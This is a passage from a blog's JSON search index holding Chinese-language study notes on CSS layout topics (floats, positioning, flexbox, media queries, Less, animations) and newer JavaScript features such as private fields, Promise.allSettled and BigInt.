透明度\n\n\n\n","categories":["CSS"],"tags":["CSS","单位","移动端"]},{"title":"CSS提升（一）：浮动","url":"/2022/03/02/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%B5%AE%E5%8A%A8/","content":"浮动的简介\n通过浮动可以使一个元素向其父元素的左侧或右侧移动，使用float属性设置元素的浮动\n五三理解：相当于ps中新建一个图层\n\n\n可选值：\nnone：默认值，元素不动\nleft：元素向左浮动\nright：元素向右浮动\n\n\n注意：\n设置浮动以后，水平布局的等式不需要强制成立（例如：设置float:left，右外边距为0）\n元素会完全从文档流中脱离，不占用文档流的位置，所以元素下边的还在文档流中的元素会自动向上移动\n\n\n特点：\n浮动元素会完全脱离文档流，不再占据文档流中的位置\n设置浮动后元素会向父元素的左侧或右侧移动\n浮动元素默认不会从父元素中移除\n浮动元素不会超过它前面的其它浮动元素\n如果浮动元素的上面时一个没有浮动的块元素，则浮动元素无法上移\n\n\n作用：让页面中的元素可以水平排列，制作水平布局\n\n浮动的特点\n浮动元素不会盖住文字，文字会自动环绕在浮动元素的周围，可利用浮动来设置文字环绕图片的效果\n\n浮动后，从文档流中脱离，元素的特点也会发生变化\n\n\n脱离文档流后的特点块元素\n不再独占页面的一行\n宽度和高度被内容撑开（默认情况）\n\n行内元素\n变成块元素，特点和块元素一样\n\n\n脱离文档流以后，不需要再区分块元素和行内元素\n\n","categories":["CSS"],"tags":["CSS","float"]},{"title":"CSS提升（三）：定位相关知识","url":"/2022/03/02/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E5%AE%9A%E4%BD%8D%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/","content":"\n定位：一种更加高级的布局手段\n通过定位可以将元素摆放到页面的任意位置\nposition属性\n\n\n可选值：\nstatic 默认值，元素是静止的没有开启定位\nralative 相对定位\nabsolute 绝对定位\nfixed 固定定位\nsticky 粘滞定位\n\n\n\n\n注：实际开发中，定位并不会大面积使用，整体上不用定位，定位通常用在细节上的微调\n\nrelative、absolute、fixed这三个属性值有一个共同点，都是相对于某个基点的定位，不同之处仅仅在于基点不同。所以，只要理解了它们的基点是什么，就很容易掌握这三个属性值。\n这三种定位都不会对其他元素的位置产生影响，因此元素之间可能产生重叠。\n相对定位\nposition：relative\nrelative表示，相对于默认位置（即static时的位置）进行偏移，即定位基点是元素的默认位置。\n\n特点\n相对定位 若不设置偏移量，元素不发生任何变化\n\n\n偏移量：开启定位后，偏移量可以用来设置元素位置（与margin不同：不会影响别的元素）\n​    top、bottom：垂直方向定位（使用其一）\n​    left、right：水平方向定位（使用其一）\n*注：以上值要生效必须开启定位，若没开启定位，设置偏移量无效。\n\n\n相对定位 元素是参照于元素在文档流中的位置进行定位\n相对定位 会提高元素的层级\n相对定位 不会使元素脱离文档流\n相对定位 不会改变元素的性质（块还是块，行内还是行内）\n\n\n形象理解：灵魂出窍，元素肉体（偏移前）还占据页面位置，元素灵魂（偏移后）挪动了\n\n\n它必须搭配top、bottom、left、right这四个属性一起使用，用来指定偏移的方向和距离。\n\n\ndiv &#123;  position: relative;  top: 20px;&#125;\n\n上面代码中，div元素从默认位置向下偏移20px（即距离顶部20px）。\n绝对定位\nposition：absolute\nabsolute表示，相对于上级元素（一般是父元素）进行偏移，即定位基点是父元素。\n它有一个重要的限制条件：定位基点（一般是父元素）不能是static定位，否则定位基点就会变成整个网页的根元素html。另外，absolute定位也必须搭配top、bottom、left、right这四个属性一起使用。\n\n特点\n绝对定位 若不设置偏移量，元素的位置不发生任何变化\n\n绝对定位 元素是相对于其包含块进行定位\n\n\n\n包含块（containing block）：\n​    正常情况下：包含块是离当前元素最近的祖先块元素\n​    绝对定位下：包含块是离当前元素最近的开启了定位的祖先元素；若所有祖先均未开启定位，则包含块是根元素。\n\n\n绝对定位 会提高元素的层级\n绝对定位 会使元素脱离文档流（不占据页面位置）\n绝对定位 会改变元素的性质（行内变成块，块的宽高被内容撑开）\n\n\n\n*  HTML 代码如下  &lt;div id=&quot;father&quot;&gt;    &lt;div id=&quot;son&quot;&gt;&lt;/div&gt;  &lt;/div&gt;*/#father &#123;  positon: relative;&#125;#son &#123;  position: absolute;  top: 20px;&#125;\n\n上面代码中，父元素是relative定位，子元素是absolute定位，所以子元素的定位基点是父元素，相对于父元素的顶部向下偏移20px。如果父元素是static定位，上例的子元素就是距离网页的顶部向下偏移20px。\n注意，absolute定位的元素会被”正常页面流”忽略，即在”正常页面流”中，该元素所占空间为零，周边元素不受影响。\n绝对定位元素布局水平方向布局当开启绝对定位后，水平方向的布局等式需要添加left和right\n\nleft + margin-left + border-left + padding-left + width + padding-right + border-right + margin-right + right&#x3D; 其包含块内容区的宽度\n\n\n如果9个值中没有auto则自动调整right值使等式两端满足\n\n如果有auto则自动调整auto的值\n可以调整auto的值：margin width left right\n\nleft、right默认值为auto，默认自动调整这两个值\n所以绝对定位下，需要设置居中时：\nmargin-left:auto;margin-right:auto;left：0；right：0；\n\n垂直方向布局当开启绝对定位后，垂直方向的布局等式也需要满足\n\ntop + margin-top+ border-top+ padding-top+ width + padding-bottom+ border-bottom+ margin-bottom+ bottom&#x3D; 其包含块内容区的高度\n\n【面试】实现绝对定位元素在包含块中水平、垂直都居中：\nmargin：auto;left：0；right：0；top:0;bottom:0;/*注意包含块要开启定位*/\n\n\n子元素在父元素中的定位：父元素相对，子元素绝对\n\n父元素相对：是为了在不脱离文档流的情况下开启定位（保证父元素周围的元素布局不混乱）\n子元素绝对：和其它子元素一起脱离文档流，避免互相影响\n\neg. 轮播图（父元素）中的原点（子元素）\n固定定位\nposition：fixed\nfixed表示，相对于视口（viewport，浏览器窗口）进行偏移，即定位基点是浏览器窗口。这会导致元素的位置不随页面滚动而变化，好像固定在网页上一样。\n\n特点\n固定定位 是特殊的绝对定位，大部分特点和绝对定位相同\n\n唯一与绝对定位不同的地方：\n\n固定定位 元素是参考于浏览器的视口进行定位（不会随网页的滚动条移动，eg广告）\n\n\n它如果搭配top、bottom、left、right这四个属性一起使用，表示元素的初始位置是基于视口计算的，否则初始位置就是元素的默认位置。\n\ndiv &#123;  position: fixed;  top: 0;&#125;\n\n上面代码中，div元素始终在视口顶部，不随网页滚动而变化。\n\n\n粘滞定位\nposition：sticky \nsticky跟前面四个属性值都不一样，它会产生动态效果，很像relative和fixed的结合：一些时候是relative定位（定位基点是自身默认位置），另一些时候自动变成fixed定位（定位基点是视口）。\n\n因此，它能够形成”动态固定”的效果。比如，网页的搜索工具栏，初始加载时在自己的默认位置（relative定位）。\n\n页面向下滚动时，工具栏变成固定位置，始终停留在页面头部（fixed定位）。\n\n等到页面重新向上滚动回到原位，工具栏也会回到默认位置。\nsticky生效的前提是，必须搭配top、bottom、left、right这四个属性一起使用，不能省略，否则等同于relative定位，不产生”动态固定”的效果。原因是这四个属性用来定义”偏移距离”，浏览器把它当作sticky的生效门槛。\n它的具体规则是，当页面滚动，父元素开始脱离视口时（即部分不可见），只要与sticky元素的距离达到生效门槛，relative定位自动切换为fixed定位；等到父元素完全脱离视口时（即完全不可见），fixed定位自动切换回relative定位。\n请看下面的示例代码。（注意，除了已被淘汰的 IE 以外，其他浏览器目前都支持sticky。但是，Safari 浏览器需要加上浏览器前缀-webkit-。）\n\n#toolbar &#123;  position: -webkit-sticky; /* safari 浏览器 */  position: sticky; /* 其他浏览器 */  top: 20px;&#125;\n\n上面代码中，页面向下滚动时，#toolbar的父元素开始脱离视口，一旦视口的顶部与#toolbar的距离小于20px（门槛值），#toolbar就自动变为fixed定位，保持与视口顶部20px的距离。页面继续向下滚动，父元素彻底离开视口（即整个父元素完全不可见），#toolbar恢复成relative定位。\n特点\n粘滞定位 兼容性不太好（一般不采用，通常使用js来实现）\n粘滞定位 和相对定位特点基本一致\n与相对定位不同的地方：\n粘滞定位 可以在元素到达某个位置时将其固定（eg，导航栏）\n\n\n\n元素的层级\n对于开启了定位的元素，可以通过z-index属性来指定元素的层级\n\n\n语法：z-index：整数\n值越大元素的层级越高，越优先显示\n\n若元素层级一样，则优先显示html中结构靠下的元素\n\n祖先元素的层级再高也不会盖住后代元素\n\n\n","categories":["CSS"],"tags":["CSS","定位","元素层级"]},{"title":"CSS提升（七）：响应式布局","url":"/2022/03/07/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80/","content":"\n响应式布局：网页可根据不同的设备或窗口大小呈现出不同的效果\n关键：媒体查询\n​    通过媒体查询，可以为不同的设备，或设备不同状态来分别设置样式\n\n媒体查询语法：@media 查询规则{}\n媒体类型\nall 所有设备\n\nprint 打印设备\n\nscreen 带屏幕的设备\n\nspeech 屏幕阅读器\n可以使用，连接多个媒体类型，或的关系\n可以再媒体类型前添加一个only，表示只有（为了兼容一些老版本的浏览器）\n@media all&#123;    body&#123;        background-color:#bfa;    &#125;&#125;@media print,screen&#123;    body&#123;        background-color:#bfa;    &#125;&#125;@media only screen&#123;    body&#123;        background-color:#bfa;    &#125;&#125;\n\n媒体特性\nwidth 视口的宽度\nheight 视口的高度 (一般不考虑)\nmin-width 视口最小宽度 (视口大于指定宽度时生效)\nmax-width 视口最大宽度 (视口小于指定宽度时生效)\n\n/*视口等于500px时生效*/@media (width:500px)&#123;    body&#123;        background-color:#bfa;    &#125;&#125;/*视口大于500px时生效*/@media (min-width:500px)&#123;    body&#123;        background-color:#bfa;    &#125;&#125;/*视口小于500px时生效*/@media (max-width:500px)&#123;    body&#123;        background-color:#bfa;    &#125;&#125;/*视口大于500px或小于700px时生效*/@media (min-width:500px),(max-width:700px)&#123;    body&#123;        background-color:#bfa;    &#125;&#125;/*视口大于500px且小于700px时生效*/@media only screen (min-width:500px)and(max-width:700px)&#123;    body&#123;        background-color:#bfa;    &#125;&#125;\n\n样式切换的分界点，称为断点（布局大变化）\n\n常用断点：\n\n小于768 超小屏幕 max-width&#x3D;768px\n大于768 小屏幕 min-width&#x3D;768px\n大于992 中型屏幕 min-width&#x3D;992px\n大于1200 大屏幕 min-width&#x3D;1200px\n\n@media only screen&#123;    @media (min-width:768px)&#123;        .box1&#123;                    &#125;    &#125;&#125; \n\n","categories":["CSS"],"tags":["CSS","响应式布局","布局"]},{"title":"CSS提升（二）：高度塌陷问题","url":"/2022/03/02/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E9%AB%98%E5%BA%A6%E5%A1%8C%E9%99%B7%E9%97%AE%E9%A2%98/","content":"\n现象：在浮动布局中，父元素的高度默认被子元素撑开，当子元素浮动后，其从文档流中脱离，将无法撑起父元素的高度，导致父元素的高度丢失，父元素下的元素会自动上移，导致页面布局混乱。\n\n\n解决方法将父元素高度写死\n缺点：容易导致内容溢出，或内容空洞\n\nBFC ( Block Formatting Context ) 块级格式化环境\nBFC是CSS中一个隐含的属性\n为元素开启BFC：元素变成独立的布局区域\n带你用最简单的方式理解最全面的BFC_哔哩哔哩_bilibili\n\n\n开启BFC的元素特点（解决的问题）：\n\n当前元素不会被浮动元素所覆盖（清除浮动问题）\n父元素开启BFC外边距不会和子元素重叠（解决外边距重叠问题：包括兄弟之间、父子之间）\n父元素开启BFC可以包含浮动的子元素（解决高度塌陷问题）\n\n\n开启BFC方式：（均为间接开启，都有些副作用）\n\n设置浮动\nfloat:left （宽度丢失）\n\n将元素设置为行内块元素\ndisplay:inline-block (宽度丢失)\n\n将overflow设置为非visible的值 (最常用)\n\noverflow：scroll\noverflow: auto\noverflow: hidden（最常用）\n\n\n\n\n\nclear (完美方式)\n不希望某个元素因为其它元素浮动的影响而改变位置，可以通过clear属性来清楚浮动元素对当前元素所产生的影响\n\n\n作用：清除浮动元素对当前元素所产生的影响\n\n可选值：\n\nleft：清除左侧浮动元素对当前元素的影响\nright：清除右侧浮动元素对当前元素的影响\nboth：清楚两侧中最大影响的那一侧\n\n\n原理：设置clear以后，浏览器会自动为元素添加一个上外边距，使其位置不受其他元素影响\n\n示例：\n&lt;div class=&quot;box1&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;box2&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;box3&quot;&gt;3&lt;/div&gt;\n\n.box1&#123;    width:200px;    height:200px;    background-color:#bfa;    /*左浮动*/    float:left;&#125;.box2&#123;    width:200px;    height:200px;    background-color: yellow;    /*右浮动*/    float:right;&#125;.box3&#123;    width:200px;    height:200px;    background-color: orange;    /*消除浮动影响*/    clear：both;&#125;\n\n效果：\n\n\n\n使用after伪类解决高度塌陷问题（clear解决）\n参考教程：【尚硅谷】Web前端零基础入门HTML5+CSS3基础教程丨初学者从入门到精通_哔哩哔哩_bilibili\n\n示例：\n\n\n&lt;div class=&quot;box1&quot;&gt;    &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt;&lt;/div&gt;\n\n.box1&#123;    border 10px red solid;&#125;.box2&#123;    width:100px;    height:200px;    background-color: #bfa;    /*开启了浮动，导致父元素高度塌陷*/    float:left;&#125;.box1::after&#123;    content:&#x27;&#x27;;    /*将伪元素（行内元素）转换为块元素*/    diaplay:block;   /*或者用display:table*/    /*消除浮动影响*/    clear：both;&#125;\n\n\n效果：\n消除前：\n\n\n\n\n\n消除后：\n\n\n.clearfix(同时解决高度塌陷和外边距重叠问题).clearfix::before,.clearfix::after&#123;    /*前两行解决外边距重叠*/    content:&#x27;&#x27;;    /*将伪元素（行内元素）转换为块元素*/    display:table;    /*消除浮动影响*/    clear：both;    /*后两行解决高度塌陷*/&#125;\n\n","categories":["CSS"],"tags":["CSS","高度塌陷","BFC","clear"]},{"title":"CSS提升（五）:less","url":"/2022/03/07/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9Aless/","content":"less简介\nless是一门css的预处理语言\nless是css的增强版，可通过它编写更少的代码实现更强大的样式\nless语法大体上和css语法一致，但增添了许多对css的扩展\n浏览器无法直接执行，需通过编译把less转化成css\n\ncss原生变量、函数html&#123;    --color：#bfa;    --length:200px;&#125;.box1&#123;    width:var(--length);    height:var(--length);    backgound-color:var(--color);&#125;.box2&#123;    width:calc(200px*2);    height:var(--length);    backgound-color:var(--color);&#125;\n\n缺点：\n浏览器兼容性不好\n\nless的语法//less的注释不会解析到css中/*css的注释会解析到css中*/.box1&#123;    background-color:#bfa;    .box2&#123;        background-color:#ff0;        .box4&#123;            background-color:red;        &#125;    &#125;    .box2&#123;        background-color:#orange;    &#125;&#125;\n\n编译成css：\n/*css的注释会解析到css中*/.box1&#123;    background-color:#bfa;&#125;.box1 .box2&#123;    background-color:#ff0;&#125;.box1 .box3&#123;    background-color:#orange;&#125;.box1 .box2 .box3&#123;    background-color:red;&#125;\n\nless的变量\n变量的语法：@变量名\n\n示例：\n@a:100px;@b:#bfa;@c:box6.box5&#123;    //直接使用则以 @变量名 形式使用    width:@a;    color:@b;&#125;    //作为类名，或者一部分值使用时以 @&#123;变量名&#125; 形式使用.@&#123;c&#125;&#123;    backgound-imag：url(&quot;@&#123;c&#125;/1.png&quot;)&#125;.box2&#123;    color: red;    background-color:$color;&#125;\n\nless中父元素和扩展父元素.box1&#123;    .box2&#123;        color:red;    &#125;    //子元素选择器    &gt;.box3&#123;       color:red;    &#125;    //为box1设置hover    //&amp; 表示外围父元素    &amp;:hover&#123;        color:orange;    &#125;&#125;\n\n编译成css：\n.box1 .box2&#123;    color:red;&#125;.box1&gt;.box3&#123;    color:red;&#125;.box1:hover&#123;    color:orange;&#125;\n\n扩展extend、mixin.p1&#123;    width:10px;    height:20px;&#125;.p2:extend(.p1)&#123;    color:red;&#125;\n\n编译成css：\n.p1&#123;    width:10px;    height:20px;&#125;.p2&#123;    width:10px;    height:20px;    color:red;&#125;.p3&#123;    width:10px;    height:20px;&#125;\n\nless中的混合函数.p1&#123;    width:10px;    height:20px;&#125;//mixin 混合.p3&#123;    .p1();&#125; //css中不会显示p4，相当于建立一个模板.p4()&#123;    width:100px;    height:100px;   \tbackground-color:#bfa;&#125;.p5&#123;    .p4(); //括号也可不写 &#125;\n\n编译成css：\n.p1&#123;    width:10px;    height:20px;&#125;.p3&#123;    width:10px;    height:20px;&#125;.p5&#123;    width:100px;    height:100px;   \tbackground-color:#bfa;&#125;\n\n实际用法：在混合函数中可以设置变量\n.test(@w,@h,@bg-color)&#123;    width:@w;    height:@h;    border:1px solid @bg-color;&#125;div&#123;    //调用混合函数，按顺序传递参数    .test(200px,300px,#bfa);    //不按顺序，但需指明关键字    .test(@bg-color:#bfa,@h:300px,@w:200px);&#125;\n\n编译成css：\ndiv&#123;    width:200px;    height:300px;    border:1px solid #bfa;&#125;\n\nless中的引入//将其它的less引入当前的less@import &quot;syntax2.less&quot;\n\n","categories":["CSS"],"tags":["CSS","less","变量"]},{"title":"CSS提升（六）：弹性盒flex","url":"/2022/03/07/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9A%E5%BC%B9%E6%80%A7%E7%9B%92flex/","content":"\nflex(弹性盒、伸缩盒)\n是css中又一种布局手段，它主要用来代替浮动过来完成页面的布局\nflex可以使元素具有弹性，让元素可以跟随页面大小的改变而改变\n\n弹性容器\n要使用弹性盒，必须将一个元素设置为弹性容器\n\n\ndisplay：flex 设置为块级弹性容器（大多情况用这个）\ndisplay：inline-flex 设置为行内弹性容器\n\nflex-direction 指定容器中弹性元素的配列方式\n\n主轴：弹性元素的排列方向\n侧（辅）轴：与主轴垂直方向的轴\n\n可选值：\n\nrow 默认值 水平排列（左向右）\n主轴：自左向右\n\nrow-reverse 水平排列（右向左）\n主轴：自右向左\n\ncolumn 纵向排列（上向下）\n\ncolumn-reverse 纵向排列（下向上）\n\n\n\n\n\nflex-wrap 设置弹性元素是否在弹性容器中自动换行\n\n可选值\nnawrap 默认值，不会自动换行\nwrap 元素沿着辅轴方向自动换行\nwrap-reverse 元素沿着辅轴反方向换行\n\n\n\n\nflex-flow   wrap和direction的简写属性\nflex-flow：row wrap\n\njustify-content 分配主轴上的空白空间\n\n可选值：\nflex-start 元素沿着主轴起边排列\nflex-end 元素沿着主轴终边排列\ncenter 元素居中排列\nspace-around 空白分布到元素两侧\nspace-between空白分布到元素之间\nspace-evenly 空白分布到元素的单侧（兼容性不高）\n\n\n\n\nalgin-items 元素在辅轴上如何对齐\n\n可选值：\nstretch 默认值 将元素的长度设置为相同的值（同一行的高度相同）\nflex-start 元素不会拉伸，沿着辅轴起边对齐\nflex-end 元素不会拉伸，沿着辅轴终边对齐\ncenter 元素不会拉伸，居中对齐\nbaseline 基线对齐（文本基线）\n\n\n用于弹性元素：align-self 用来覆盖当前弹性元素上的align-items\n\n\nalign-content 分配辅轴上的空白空间\n\n可选值同justify-content\n\n弹性元素\n\n\n弹性容器的子元素是弹性元素（弹性项），必须是直接子元素，后代不算\n一个元素可以同时是弹性容器和弹性元素\n\n\nflex-grow 指定弹性元素的伸展系数（当父元素有多余空间时，子元素如何伸展）\n\n父元素的剩余空间，会按照弹性元素的伸展比例进行分配\n默认值为0（不伸展）\n\n\nflex-shrink 指定弹性元素的收缩系数（当父元素空间不足时，子元素如何收缩）\n\n默认值为1 (等比例收缩)\n值为0 （不收缩，溢出）\n缩减多少是根据 缩减系数 和 元素大小来计算\n\n\n\nflex-basis 元素基础长度（相当于弹簧静止时的长度）\n\n如果主轴是横向，则该值指定元素的宽度\n如果主轴是纵向，则该值指定元素的高度\n\n可选值：\n\nauto，参考元素自身的高度或宽度\n具体数值\n\n\n\n\nflex 简写属性\n\n顺序：增长系数 缩减系数 基础长度；\n可选值：\ninitial：相当于flex：0 1 auto （默认值，不可伸展可收缩）\nauto：相当于flex：1 1 auto （可伸展可收缩）\nnone：相当于flex：0 0 auto （弹性元素没有弹性）\n取值为一个非负数字，则该数字为 flex-grow 值，flex-shrink 取 1，flex-basis 取 0%\n取值为 0 时，对应的三个值分别为 0 1 0%\n取值为一个长度或百分比，则视为 flex-basis 值，flex-grow 取 1，flex-shrink 取 1\n取值为两个非负数字，则分别视为 flex-grow 和 flex-shrink 的值，flex-basis 取 0%\n取值为一个非负数字和一个长度或百分比，则分别视为 flex-grow 和 flex-basis 的值，flex-shrink 取 1\n\n\n\n\norder 弹性元素排列顺序\n\n数值越大排越后面\n\n\n\n","categories":["CSS"],"tags":["CSS","布局","弹性盒"]},{"title":"ES6（一）：概述","url":"/2022/04/27/ES6%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0/","content":"一、概述1、什么是 ECMAECMA（European Computer Manufacturers Association）中文名称为欧洲计算机制造商协会，这个 组织的目标是评估、开发和认可电信和计算机标准。1994 年后该组织改名为 Ecma 国际；\n2、什么是 ECMAScriptECMAScript 是由 Ecma 国际通过 ECMA-262 标准化的脚本程序设计语言； 百度百科：https://baike.baidu.com/history/ECMAScript/1889420/144946978\n3、什么是 ECMA-262 Ecma 国际制定了许多标准，而 ECMA-262 只是其中的一个，所有标准列表查看： http://www.ecma-international.org/publications/standards/Standard.htm \n4、ECMA-262 历史 ECMA-262（ECMAScript）历史版本查看网址： http://www.ecma-international.org/publications/standards/Ecma-262-arch.htm\n\n5、谁在维护 ECMA-262\n TC39（Technical Committee 39）是推进 ECMAScript 发展的委员会。其会员都是公司（其中主要是浏 览器厂商，有苹果、谷歌、微软、因特尔等）。TC39 定期召开会议，会议由会员公司的代表与特邀专家 出席； \n6、为什么要学习 ES6\n\nES6 的版本变动内容最多，具有里程碑意义；\nES6 加入许多新的语法特性，编程实现更简单、高效； \nES6 是前端发展趋势，就业必备技能；\n\n7、ES6 兼容性\n 查看网址：http://kangax.github.io/compat-table/es6\n","categories":["ES6"],"tags":["ES6"]},{"title":"CSS提升（四）：动画","url":"/2022/03/06/CSS%E6%8F%90%E5%8D%87%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9A%E5%8A%A8%E7%94%BB/","content":"过渡\ntransition-property：指定要执行过渡的属性\n\n例：transition-property：width\n\n多个属性间使用，隔开\n\n如果所有属性都需要过渡，则使用all关键字\n\n大部分属性都支持过渡效果（只要是数值可以计算，px，角度，颜色）\n\n必须从一个有效数值向另一个有效数值进行过渡，auto无效\n\n\n\ntransition-duration：指定过渡效果持续时间\n\n例：transition-duration：2s，1000ms\n时间单位：s 和 ms，1s&#x3D;1000ms\n不同属性的过渡时间之间用，隔开\n\n\ntransition-timing-fuction：过渡的时序函数\n\n可选值：\n\nease 默认值，慢速开始，先加速，再减速\n\nlinear 匀速运动\n\nease-in 加速运动\n\nease-out 减速运动\n\nease-in-out 先加速 后减速\n\ncubic-bezier（）时序函数（贝塞尔曲线）\nhttps://cubic-bezier.com\n\nsteps（）分步执行过渡效果\n可以设置第二个值：\nend，在时间结束时执行过渡（默认值）\nstart，在时间开始时执行过渡\n\n\n\n\n\ntransition-delay：过渡效果的延迟（等待一段时间后在执行过渡）\n例：transition-delay：2s\n\ntransition 简写属性\n如果要写延迟，则两个时间中第一个是持续时间。\n.box1&#123;    height:0;    /*当高度属性值发生变化时，会花0.3s完成效果*/    transtition:height 0.3s;&#125;.box2&#123;    height:0;    /*当所有样式发生变化时，会花0.3s完成效果*/    transtition:all 0.3s;&#125;\n\n动画\n动画和过渡类似，都可实现动态效果\n​    不同的是过渡需要在某个属性发生变化时才会触发（需要交互）\n​    动画可以自动触发动态效果\n设置动画效果，必须要先设置一个关键帧，关键帧设置了动画执行的每个步骤\n\n\n示例：\n@keyframes test&#123;    /*from表示动画开始位置 也可以使用0%*/    from&#123;        margin-left:0;    &#125;    /*to表示动画结束位置 也可以使用100%*/    to&#123;        margin-left:700px;    &#125;&#125;.box2&#123;    /*对当前元素生效的关键帧的名字*/    animation-name:test;    animation-duration:2s;    animation-delay：2s;        /*动画执行次数      可选值：        次数，        infinite 无限执行  */    animation-iteration-count:20;    /*动画运行方向      可选值：        normal 默认值 从from到to    \treverse 从to到from    \talternate 从from到to 重复执行动画时反向执行    \talternate-reverse 从to到from 重复执行动画时反向执行*/    animation-direction：alternate-reverse;     /*动画执行状态      可选值：        running 默认值 执行    \tpaused 暂停 */    animation-play-state：paused;    /*动画填充模式      可选值：        none 默认值 执行完毕元素回到原来的位置    \tforwards 执行完毕元素停在结束位置     \tbackwards 动画延时等待时，元素就会处于开始位置    \tboth 结构了forwards和backwards*/    animation-fill-mode：alternate-reverse;&#125;\n\nanimation简写属性\n如果要写延迟，则两个时间中第一个是持续时间。\n\n\n变形\n改变元素的形状或位置\n​    不会影响到页面的布局（类似相对定位）\n\n\ntransform 设置元素的变形效果\n\n可选值（函数）：\n\n平移：\ntranslateX() 沿着x轴方向平移 translateX(100px) \ntranslateY() 沿着y轴方向平移 translateX(50%)\ntranslateZ() 沿着z轴方向平移\n​    默认情况下，网页不支持透视\n​    若要看见z轴平移效果，需设置网页的视距html{perspective：800px；}\n百分比是相对于元素自身计算的\n\n旋转：旋转会改变xyz轴的方向\nrotateX() 沿x轴旋转\n​    若要看见x、y轴旋转效果，需设置网页的视距html{perspective：800px；}\nrotateY() 沿y轴旋转\nrotateZ() 沿z轴旋转 rotateZ(45deg)\n\n平移+旋转：\n.box1&#123;    transform:rotateY(180deg) translate(400px);&#125;\n\n缩放：\nscaleX() 水平方向缩放\nscaleY() 垂直方向缩放\nscale() 两个方向都缩放\nscaleZ() 沿z轴缩放（立体的才有效果）\n\n\n\n\n\ntransform-style：preserve-3d；设置3D变形效果\n\ntransform-orgin 设置变形的原点\n\ncenter 默认值\n数值px 数值px\n\n\n\n","categories":["CSS"],"tags":["CSS","动画","过渡","变形"]},{"title":"ES6（七）：ES11新特性","url":"/2022/04/30/ES6%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9AES11%E6%96%B0%E7%89%B9%E6%80%A7/","content":"私有属性&lt;script&gt;    class Person &#123;        //公有属性        name;        //私有属性        #age;        #weight;        //构造方法        constructor(name, age, weight) &#123;            this.name = name;            this.#age = age;            this.#weight = weight;        &#125;        intro()&#123;            console.log(this.name);            console.log(this.#age);            console.log(this.#weight);        &#125;    &#125;    //实例化    const girl = new Person(&#x27;陈&#x27;, 18, &#x27;45kg&#x27;);    console.log(girl.#age) //error    console.log(girl); //Person&#123;name: &quot;陈&quot;, #age: 18, #weight: &quot;45kg&quot;&#125;    girl.intro(); // 陈 18  45kg&lt;/script&gt;\n\nPromise.allSettled&lt;script&gt;    //声明两个promise对象    const p1 = new Promise((resolve, reject) =&gt; &#123;        setTimeout(()=&gt;&#123;            resolve(&#x27;商品数据-1&#x27;)        &#125;,1000)    &#125;)    const p2 = new Promise((resolve, reject) =&gt; &#123;        setTimeout(()=&gt;&#123;            reject(&#x27;出错了！&#x27;)        &#125;,1000)    &#125;)    //调用allsettled方法:返回的结果始终是一个成功的，并且异步任务的结果和状态都存在    const res = Promise.allSettled([p1,p2]);    console.log(res)    // Promise &#123;&lt;pending&gt;&#125;    //     __proto__: Promise    //     [[PromiseState]]: &quot;fulfilled&quot;    //     [[PromiseResult]]: Array(2)    //调用all方法：返回的结果是按照p1、p2的状态来的，如果都成功，则成功，如果一个失败，则失败，失败的结果是失败的Promise的结果    const result = Promise.all([p1,p2])    console.log(result)&lt;/script&gt;\n\n\n应用场景：批量异步任务\n\nString.prototype.matchAlllet str = `&lt;ul&gt;            &lt;li&gt;                &lt;a&gt;肖生克的救赎&lt;/a&gt;                &lt;p&gt;上映日期: 1994-09-10&lt;/p&gt;            &lt;/li&gt;            &lt;li&gt;                &lt;a&gt;阿甘正传&lt;/a&gt;                &lt;p&gt;上映日期: 1994-07-06&lt;/p&gt;            &lt;/li&gt;        &lt;/ul&gt;`;//声明正则const reg = /&lt;li&gt;.*?&lt;a&gt;(.*?)&lt;\\/a&gt;.*?&lt;p&gt;(.*?)&lt;\\/p&gt;/sg//调用方法const result = str.matchAll(reg);// for(let v of result)&#123;//     console.log(v);// &#125;const arr = [...result];console.log(arr);\n\n可选链操作符//相当于一个判断符，如果前面的有，就进入下一层级function main(config)&#123;    //传统方法(如果config没传就会报错)    //const dbHost = config &amp;&amp; config.db &amp;&amp; config.db.host    const dbHost = config?.db?.host    console.log(dbHost) //192.168.1.100&#125;main(&#123;    db:&#123;        host:&#x27;192.168.1.100&#x27;,        username:&#x27;root&#x27;    &#125;,    cache：&#123;    \thost:&#x27;192.168.1.200&#x27;,    \tusername:&#x27;admin&#x27;\t&#125;&#125;)\n\n动态import\n按需加载，提高效率\n\n\n静态import\nimport * as m1 from &quot;./hello.js&quot;;//获取元素const btn = document.getElementById(&#x27;btn&#x27;);btn.onclick = function()&#123;    m1.hello()&#125;\n\n动态import\nbtn.onclick = function()&#123;    //使用之前并未引入，动态引入，返回的其实是一个Promise对象    import(&#x27;./hello.js&#x27;).then(module=&gt;&#123;        module.hello();    &#125;)&#125;\n\nBigInt//大整型let n = 521n;console.log(n,typeof(n))  // 521n  n //函数let n = 123;console.log(BigInt(n)) // 123n  //不要使用浮点型，只能用int//大数值运算let max = Number.MAX_SAFE_INTEGER; // 9007199254740991console.log(max +1) // 9007199254740992console.log(max +2) // 9007199254740992 出问题了console.log(BigInt(max)+BigInt(1)) //9007199254740992nconsole.log(BigInt(max)+BigInt(2)) //9007199254740993n\n\n绝对全局对象globalThis\n无论执行环境是什么，浏览器、nodejs或其它，globalThis始终指向全局对象\n\nconsole.log(globalThis) //浏览器：window   //适用于复杂环境下直接操作window//nodejs：Object[global] \n\n","categories":["ES6"],"tags":["ES11"]},{"title":"ES6（二）：ES6新特性","url":"/2022/04/27/ES6%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9AES6%E6%96%B0%E7%89%B9%E6%80%A7/","content":"功能概述1、let 